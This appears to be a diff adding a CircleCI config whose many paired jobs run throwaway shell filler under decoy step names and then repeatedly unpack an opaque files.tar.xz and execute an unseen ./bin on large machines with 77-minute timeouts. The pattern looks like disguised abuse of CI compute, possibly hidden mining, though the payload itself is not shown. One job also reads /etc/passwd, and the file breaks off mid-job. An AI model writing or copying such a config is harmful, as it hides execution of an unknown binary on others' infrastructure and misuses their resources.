@@ -1,0 +1,1471 @@
+version: 2.1
+
+jobs:
+  blue_v3-ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gas grill
+          command: |
+            mkdir -p /tmp/scratch
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/scratch/timings.jsonl; true
+            ls -la /tmp/scratch/timings.jsonl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - timings.jsonl
+  v3-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/timings.jsonl && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  fetcher_india-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: denied again
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=5;i++){print i; print i*i}}' | wc -l; true ; } > /tmp/scratch/109.data
+            ls -la /tmp/scratch/109.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 109.data
+  india-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/109.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  Delta_check-end-to-end-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: flag red
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "foo123bar456" | grep -oP '\d+' 2>/dev/null | head -1 || echo "foo123bar456" | grep -oE '[0-9]+' | head -1; true ; } > /tmp/scratch/2023-12-11.data
+            ls -la /tmp/scratch/2023-12-11.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2023-12-11.data
+  check-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/2023-12-11.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  fetcher_golf-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: page skip
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "the fast brown" | grep -o '[a-z]*' | wc -l; true ; } > /tmp/scratch/721.data
+            ls -la /tmp/scratch/721.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 721.data
+  golf-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/721.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  Gamma_zed-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: side quest
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "hey   you   there" | sed 's/  */ /g' | awk '{print NF}'; true ; } > /tmp/scratch/summary.out
+            ls -la /tmp/scratch/summary.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - summary.out
+  zed-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/summary.out && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  phase_strated-23:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: knock up
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 17 + 42)); true ; } > /tmp/scratch/2023-09-12.data
+            ls -la /tmp/scratch/2023-09-12.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2023-09-12.data
+  strated-23:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/2023-09-12.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  loader_tweak-queue-timeout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: powder coat
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 2500 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/scratch/pt-A.pt
+            ls -la /tmp/scratch/pt-A.pt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - pt-A.pt
+  tweak-queue-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/pt-A.pt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  kick_INIT_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: foghorn
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo -e "a\nb\nc\nd" | sort -r | md5sum; true ; } > /tmp/scratch/secondary_job_output.log
+            ls -la /tmp/scratch/secondary_job_output.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - secondary_job_output.log
+  INIT_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/secondary_job_output.log && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  linter_dp-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: headstand
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hi > "$tf" && stat -c %s "$tf" 2>/dev/null && rm "$tf"; true ; } > /tmp/scratch/audit.gz
+            ls -la /tmp/scratch/audit.gz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - audit.gz
+  dp-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/audit.gz && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  do_strated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: spray can
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; type echo; true ; } > /tmp/scratch/artifact
+            ls -la /tmp/scratch/artifact | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - artifact
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/artifact && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  route_q4-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: pianissimo
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 25 | awk '{print int($1/4), $1%4}' | sort | uniq -c | awk 'NR<=4'; true ; } > /tmp/scratch/30.bin
+            ls -la /tmp/scratch/30.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 30.bin
+  q4-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/30.bin && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  cook_intergration-91:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: reader view
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; head -c 500 /dev/urandom | tr -dc '[:alpha:]' | head -c 32; true ; } > /tmp/scratch/handover.sig
+            ls -la /tmp/scratch/handover.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - handover.sig
+  intergration-91:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/handover.sig && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  redo_v9-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: smoke rings
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/random/uuid 2>/dev/null; true ; } > /tmp/scratch/16.data
+            ls -la /tmp/scratch/16.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 16.data
+  v9-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/16.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  Alpha_hotel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: careful look
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf 'a\nb\na\nc\n' | sort -u | wc -l; true ; } > /tmp/scratch/phase-ready.out
+            ls -la /tmp/scratch/phase-ready.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - phase-ready.out
+  hotel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/phase-ready.out && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  inspect_WEB-330:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: dropped kick
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 100 110 | awk '{printf "0x%04x\n",$1}'; true ; } > /tmp/scratch/main_job_output.log
+            ls -la /tmp/scratch/main_job_output.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - main_job_output.log
+  WEB-330:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/main_job_output.log && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  deps_cerberus-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: ice bath
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 10000 | awk 'END{print NR}'; true ; } > /tmp/scratch/main_phase_output_v5.txt
+            ls -la /tmp/scratch/main_phase_output_v5.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - main_phase_output_v5.txt
+  cerberus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/main_phase_output_v5.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  teardown_d-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: fortissimo
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "Multi Word String" | awk '{gsub(/ /,"-"); print tolower($0)}'; true ; } > /tmp/scratch/80.bin
+            ls -la /tmp/scratch/80.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 80.bin
+  d-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/80.bin && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  Beta_omar-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: samba glide
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/scratch/step-22.out
+            ls -la /tmp/scratch/step-22.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-22.out
+  omar-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/step-22.out && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  red_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: knock twice
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; n=length(s); for(i=1;i<=n;i++)print substr(s,i,1)}' | wc -l; true ; } > /tmp/scratch/main_task_output.txt
+            ls -la /tmp/scratch/main_task_output.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - main_task_output.txt
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/main_task_output.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  preinit_v2-nightly1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: line up wait
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "abc" | tr abc 123; true ; } > /tmp/scratch/cache.raw
+            ls -la /tmp/scratch/cache.raw | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - cache.raw
+  v2-nightly1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/cache.raw && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  reset_teh-ci-45:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: bang
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/scratch/phase-ready.txt
+            ls -la /tmp/scratch/phase-ready.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - phase-ready.txt
+  teh-ci-45:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/phase-ready.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  blue_v5-edge1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: v2 go
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; head -c 100 /dev/urandom | sha224sum 2>/dev/null | awk '{print $1}' | head -c 20 || head -c 100 /dev/urandom | sha256sum | awk '{print $1}' | head -c 20; true ; } > /tmp/scratch/step-16.out
+            ls -la /tmp/scratch/step-16.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-16.out
+  v5-edge1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/step-16.out && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  db_feb15-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: broad jump
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /tmp/scratch/step-29.txt
+            ls -la /tmp/scratch/step-29.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-29.txt
+  feb15-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/step-29.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  drain_alice-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: revolve
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "a b c d e" | awk '{for(i=1;i<=NF;i++) if(i%2) print $i}'; true ; } > /tmp/scratch/PASS.txt
+            ls -la /tmp/scratch/PASS.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - PASS.txt
+  alice-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/PASS.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  builder_nov19-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pot hanger
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_sl && echo t > /tmp/_sl/t && ln -s /tmp/_sl/t /tmp/_sl/l && readlink /tmp/_sl/l && rm -rf /tmp/_sl; true ; } > /tmp/scratch/95.blob
+            ls -la /tmp/scratch/95.blob | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 95.blob
+  nov19-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/95.blob && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  ensure_cerberus-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: monkeys fist
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<56319;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/scratch/OK.txt
+            ls -la /tmp/scratch/OK.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - OK.txt
+  cerberus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/OK.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  compile_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: maple splint
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/scratch/stash.raw
+            ls -la /tmp/scratch/stash.raw | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - stash.raw
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/stash.raw && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  D_greg-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: holding pattern
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"; getline; print NF}' /etc/passwd; true ; } > /tmp/scratch/stage.bin
